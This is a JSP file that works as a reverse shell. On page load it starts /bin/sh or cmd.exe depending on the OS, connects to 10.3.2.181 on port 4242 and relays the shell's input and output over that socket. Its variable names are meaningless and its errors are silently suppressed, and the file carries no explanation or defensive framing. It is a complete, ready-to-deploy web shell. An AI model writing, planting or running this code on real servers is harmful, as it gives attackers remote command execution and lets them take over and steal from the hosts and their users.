<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream wj;
    OutputStream cf;

    StreamConnector( InputStream wj, OutputStream cf )
    {
      this.wj = wj;
      this.cf = cf;
    }

    public void run()
    {
      BufferedReader xg  = null;
      BufferedWriter uzd = null;
      try
      {
        xg  = new BufferedReader( new InputStreamReader( this.wj ) );
        uzd = new BufferedWriter( new OutputStreamWriter( this.cf ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = xg.read( buffer, 0, buffer.length ) ) > 0 )
        {
          uzd.write( buffer, 0, length );
          uzd.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( xg != null )
          xg.close();
        if( uzd != null )
          uzd.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.3.2.181", 4242 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
